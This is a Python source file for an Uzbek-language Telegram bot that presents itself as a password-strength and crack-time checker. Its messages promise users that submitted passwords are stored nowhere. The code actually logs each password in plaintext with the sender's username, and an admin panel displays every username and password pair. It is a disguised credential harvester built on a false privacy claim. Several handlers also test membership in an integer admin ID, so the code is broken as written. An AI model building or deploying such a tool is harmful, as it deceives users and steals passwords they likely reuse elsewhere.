import asyncio
import sqlite3
import re
from datetime import datetime
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import CommandStart, Command
from aiogram.types import Message, CallbackQuery
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.enums import ParseMode
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

BOT_TOKEN = "Bot_token" #@BotFather dan olingan bot tokenini qo'yasiz.
ADMIN_ID = 12345678 #Admin id yoziladi.

router = Router()
bot = Bot(token=BOT_TOKEN, default_parse_mode=ParseMode.HTML)
dp = Dispatcher()

class PasswordStates(StatesGroup):
    waiting_for_password = State()
    waiting_for_check = State()

def get_main_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🔐 Parol Tekshirish")],
            [KeyboardButton(text="📊 Mening Statistikam"), KeyboardButton(text="ℹ️ Yordam")]
        ],
        resize_keyboard=True,
        one_time_keyboard=False
    )

def get_admin_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🔐 Parol Tekshirish")],
            [KeyboardButton(text="📊 Mening Statistikam"), KeyboardButton(text="ℹ️ Yordam")],
            [KeyboardButton(text="👑 Admin Panel")]
        ],
        resize_keyboard=True,
        one_time_keyboard=False
    )

def get_cancel_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="❌ Bekor qilish")]],
        resize_keyboard=True,
        one_time_keyboard=True
    )

def get_home_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="🏠 Asosiy Menyu")]],
        resize_keyboard=True
    )

def init_db():
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS checks_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            password TEXT,
            strength_result TEXT,
            crack_time TEXT,
            check_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

def log_user_and_check(user_id, username, first_name, password, strength_result, crack_time):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('''INSERT OR IGNORE INTO users (user_id, username, first_name) 
                      VALUES (?, ?, ?)''', (user_id, username, first_name))
    cursor.execute('''INSERT INTO checks_log (user_id, username, password, strength_result, crack_time) 
                      VALUES (?, ?, ?, ?, ?)''', (user_id, username, password, strength_result, crack_time))
    conn.commit()
    conn.close()

def get_admin_stats():
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM checks_log")
    total_checks = cursor.fetchone()[0]
    cursor.execute('''
        SELECT username, password, strength_result, crack_time, check_time 
        FROM checks_log
        ORDER BY check_time DESC
    ''')
    recent_logs = cursor.fetchall()
    conn.close()
    return total_users, total_checks, recent_logs

def estimate_crack_time(password: str) -> str:
    pool = 0
    if re.search(r"[a-z]", password): pool += 26
    if re.search(r"[A-Z]", password): pool += 26
    if re.search(r"\d", password): pool += 10
    if re.search(r"[!@#$%^&*(),.?\":{}|]", password): pool += 32
    if pool == 0: pool = 26
    
    combinations = pool ** len(password)
    speed = 10_000_000_000
    seconds = combinations / speed
    
    if seconds < 1: return "Lahzada (< 1 soniya) 🔴"
    elif seconds < 60: return f"{int(seconds)} soniya 🔴"
    elif seconds < 3600: return f"{int(seconds // 60)} daqiqa 🟡"
    elif seconds < 86400: return f"{int(seconds // 3600)} soat 🟡"
    elif seconds < 31536000: return f"{int(seconds // 86400)} kun 🟢"
    elif seconds < 3153600000: return f"{int(seconds // 31536000)} yil 🟢"
    else:
        years = int(seconds // 31536000)
        return f"{years:,} yil 🛡".replace(',', ' ')

def evaluate_password(password: str) -> tuple[str, list]:
    score = 0
    tips = []

    if len(password) >= 8: score += 1
    else: tips.append("🔹 Parol uzunligi kamida 8 ta belgidan iborat bo'lishi shart.")

    if re.search(r"[A-Z]", password): score += 1
    else: tips.append("🔹 Kamida bitta bosh harf qo'shing (A-Z).")

    if re.search(r"[a-z]", password): score += 1
    else: tips.append("🔹 Kamida bitta kichik harf qo'shing (a-z).")

    if re.search(r"\d", password): score += 1
    else: tips.append("🔹 Kamida bitta raqam qo'shing (0-9).")

    if re.search(r"[!@#$%^&*(),.?\":{}|]", password): score += 1
    else: tips.append("🔹 Kamida bitta maxsus belgi qo'shing (masalan: @, #, $).")

    if score <= 2: return "🔴 ZAIF PAROL", tips
    elif score <= 4: return "🟡 O'RTACHA PAROL", tips
    else: return "🟢 KUCHLI PAROL", tips

def get_password_strength_bar(password: str) -> str:
    pool = 0
    if re.search(r"[a-z]", password): pool += 1
    if re.search(r"[A-Z]", password): pool += 1
    if re.search(r"\d", password): pool += 1
    if re.search(r"[!@#$%^&*(),.?\":{}|]", password): pool += 1
    
    filled = "█" * pool
    empty = "░" * (4 - pool)
    return f"{filled}{empty}"

@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    text = (
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃   🔐 PAROLIM KUCHLIMI? 🔐    ┃\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"Assalomu alaykum, {message.from_user.first_name}! 👋\n\n"
        f"📝 BOT HAQIDA:\n"
        f"Men sizning parolingizni tahlil qilib, uning kuchliligi va xavfsizligini aniqlab beraman.\n\n"
        f"⚡ IMKONIYATLAR:\n"
        f"✅ Parol kuchini tekshirish\n"
        f"✅ Brute-force hujumiga qarshi vaqt hisoblash\n"
        f"✅ Xavfsizlikni oshirish bo'yicha maslahatlar\n"
        f"✅ Shaxsiy statistika\n\n"
        f"⚠️ XAVFSIZLIK:\n"
        f"Parolingiz hech qayerda saqlanmaydi va faqat tahlil uchun ishlatiladi.\n\n"
        f"Boshlashga tayyor? 🚀 Menyu tugmasini bosing!"
    )
    keyboard = get_admin_keyboard() if message.from_user.id in ADMIN_ID else get_main_keyboard()
    await message.answer(text, reply_markup=keyboard)

@router.message(Command("help"))
async def cmd_help(message: Message):
    text = (
        f"📚 FOYDALANISH BO'YICHA YORDAM:\n\n"
        f"1. 🔐 Parol Tekshirish\n"
        f"   • Paroli kiritib tekshiring\n"
        f"   • Kuchliligi va hujumga qarshi vaqtni bilin\n\n"
        f"2. 📊 Statistika\n"
        f"   • O'zingizning tekshiruvlarni ko'ring\n\n"
        f"3. 🛡️ KUCHLI PAROL YARATISH QOIDALARI:\n"
        f"   • Kamida 8 ta belgi\n"
        f"   • Bosh va kichik harflar\n"
        f"   • Raqamlar (0-9)\n"
        f"   • Maxsus belgilar (@,#,$,%,&)\n\n"
        f"⏱️ VAQT TUZATISH:\n"
        f"   • < 1 sekund = 🔴 Zaifish kuchli hujum\n"
        f"   • 1 - 60 sekund = 🔴 Zaif\n"
        f"   • 1 - 24 soat = 🟡 O'rtacha\n"
        f"   • > 1 yil = 🟢 Kuchli\n"
    )
    keyboard = get_admin_keyboard() if message.from_user.id in ADMIN_ID else get_main_keyboard()
    await message.answer(text, reply_markup=keyboard)

@router.message(F.text == "🔐 Parol Tekshirish")
async def start_password_check(message: Message, state: FSMContext):
    await state.set_state(PasswordStates.waiting_for_password)
    text = (
        f"🔐 PAROL TEKSHIRUVI\n\n"
        f"Iltimos, tekshirmoqchi bo'lgan parolingizni yuboring.\n"
        f"Xavfsizlik: Parol hech qayerda saqlanmaydi.\n\n"
        f"Masalan: MyPassword123!@#"
    )
    await message.answer(text, reply_markup=get_cancel_keyboard())

@router.message(PasswordStates.waiting_for_password)
async def process_password_check(message: Message, state: FSMContext):
    password = message.text
    
    if password == "❌ Bekor qilish":
        await state.clear()
        await message.answer("❌ Operatsiya bekor qilindi.", reply_markup=get_main_keyboard())
        return

    strength, tips = evaluate_password(password)
    crack_time = estimate_crack_time(password)
    strength_bar = get_password_strength_bar(password)
    
    log_user_and_check(
        user_id=message.from_user.id,
        username=message.from_user.username or "Anonymous",
        first_name=message.from_user.first_name,
        password=password,
        strength_result=strength,
        crack_time=crack_time
    )

    response = (
        f"╔═══════════════════════════════╗\n"
        f"║  🔍 PAROL TAHLILI NATIJASI  ║\n"
        f"╚═══════════════════════════════╝\n\n"
        f"📊 PAROL KUCHLI DARAJASI: {strength}\n"
        f"📈 KUCH INDIKATORI: {strength_bar}\n"
        f"🔤 UZUNLIGI: {len(password)} ta belgi\n\n"
        f"⏱️ BUZISH VAQTI (BRUTE-FORCE):\n"
        f"   ➤ {crack_time}\n"
    )

    if tips:
        response += f"\n💡 TAVSIYALAR:\n"
        response += "\n".join(tips)
    else:
        response += (
            f"\n🎉 JAVOBGARLIK:\n"
            f"✅ Parolingiz juda kuchli va xavfsiz!\n"
            f"✅ Kiberhujumlarga qarshi mustahkam himoyalangan.\n"
            f"✅ Bu parolni ko'p vaqt ishlatishingiz mumkin."
        )

    await state.clear()
    keyboard = get_admin_keyboard() if message.from_user.id in ADMIN_ID else get_main_keyboard()
    await message.answer(response, reply_markup=keyboard)

@router.message(F.text == "📊 Mening Statistikam")
async def get_user_stats(message: Message):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT COUNT(*), strength_result FROM checks_log 
        WHERE user_id = ? 
        GROUP BY strength_result
    ''', (message.from_user.id,))
    stats = cursor.fetchall()
    
    cursor.execute('''
        SELECT strength_result, crack_time, check_time FROM checks_log 
        WHERE user_id = ? 
        ORDER BY check_time DESC LIMIT 10
    ''', (message.from_user.id,))
    recent = cursor.fetchall()
    conn.close()

    text = (
        f"┏━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  📊 SHAXSIY STATISTIKA ┃\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
    )
    
    if stats:
        total = sum(count for count, _ in stats)
        text += f"Jami tekshiruvlar: {total} ta\n\n"
        for count, strength in stats:
            text += f"  {strength}: {count} ta\n"
        
        text += f"\n📋 SO'NGGI TEKSHIRUVLAR (10 ta):\n"
        if recent:
            for i, (strength, crack_time, check_time) in enumerate(recent, 1):
                dt_obj = datetime.strptime(check_time, "%Y-%m-%d %H:%M:%S")
                formatted_time = dt_obj.strftime("%H:%M | %d.%m")
                text += f"{i}. {strength} ({crack_time}) - {formatted_time}\n"
        else:
            text += "Hozircha tekshiruvlar yo'q."
    else:
        text += "❌ Hozircha hech qanday tekshiruv yo'q.\nBoshlash uchun '🔐 Parol Tekshirish' tugmasini bosing."

    keyboard = get_admin_keyboard() if message.from_user.id in ADMIN_ID else get_main_keyboard()
    await message.answer(text, reply_markup=keyboard)

@router.message(F.text == "ℹ️ Yordam")
async def show_help(message: Message):
    await cmd_help(message)

@router.message(F.text == "👑 Admin Panel")
async def cmd_admin(message: Message):
    if message.from_user.id not in ADMIN_ID:
        await message.answer("🚫 Ruxsat etilmagan kirish!\nSizda admin huquqi yo'q.", reply_markup=get_main_keyboard())
        return

    users_count, checks_count, recent_logs = get_admin_stats()
    
    text = (
        f"╔═══════════════════════════════╗\n"
        f"║   👑 ADMIN PANEL 👑          ║\n"
        f"╚═══════════════════════════════╝\n\n"
    )
    text += f"👥 UMUMIY FOYDALANUVCHILAR: {users_count} ta\n"
    text += f"🔐 JAMI TEKSHIRUVLAR: {checks_count} ta\n"
    text += f"📈 O'RTACHA TEKSHIRUVLAR: {checks_count // max(users_count, 1)} ta\n\n"
    text += "📋 BARCHA TEKSHIRUVLAR:\n"
    text += "─" * 35 + "\n"
    
    if recent_logs:
        for idx, (username, password, strength, crack_time, time) in enumerate(recent_logs, 1):
            dt_obj = datetime.strptime(time, "%Y-%m-%d %H:%M:%S")
            formatted_time = dt_obj.strftime("%H:%M | %d.%m.%Y")
            text += f"{idx}. Username: @{username}\n"
            text += f"   Parol: {password}\n"
            text += f"   Natija: {strength}\n"
            text += f"   Buzish vaqti: {crack_time}\n"
            text += f"   Vaqt: {formatted_time}\n\n"
    else:
        text += "Hozircha tizimda harakatlar yo'q.\n"

    await message.answer(text, reply_markup=get_admin_keyboard())

@router.message(F.text == "🏠 Asosiy Menyu")
async def go_home(message: Message, state: FSMContext):
    await state.clear()
    text = "🏠 ASOSIY MENYU - Tugmalardan birini tanlang:"
    keyboard = get_admin_keyboard() if message.from_user.id in ADMIN_ID else get_main_keyboard()
    await message.answer(text, reply_markup=keyboard)

@router.message(F.text == "❌ Bekor qilish")
async def cancel_operation(message: Message, state: FSMContext):
    await state.clear()
    text = "❌ Operatsiya bekor qilindi."
    keyboard = get_admin_keyboard() if message.from_user.id in ADMIN_ID else get_main_keyboard()
    await message.answer(text, reply_markup=keyboard)

@router.message()
async def default_handler(message: Message):
    text = (
        f"❓ NOTO'G'RI BUYRUQ!\n\n"
        f"Iltimos, menyu tugmalaridan foydalaning yoki:\n"
        f"/start - Botni qayta boshlash\n"
        f"/help - Yordamni ko'rish\n"
        f"/admin - Admin panelga kirish"
    )
    keyboard = get_admin_keyboard() if message.from_user.id in ADMIN_ID else get_main_keyboard()
    await message.answer(text, reply_markup=keyboard)

async def main():
    print("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    print("┃  🔐 KIBERXAVFSIZLIK BOT 🔐  ┃")
    print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    print("\n[✓] Baza inicializatsiya qilinmoqda...")
    init_db()
    
    print("[✓] Bot handlerlari ro'yxatdan o'tilmoqda...")
    dp.include_router(router)
    
    print("[✓] Tizim onlayn. Kuting...")
    print("━" * 35)
    
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[✗] Aloqa uzildi. Bot to'xtatildi.")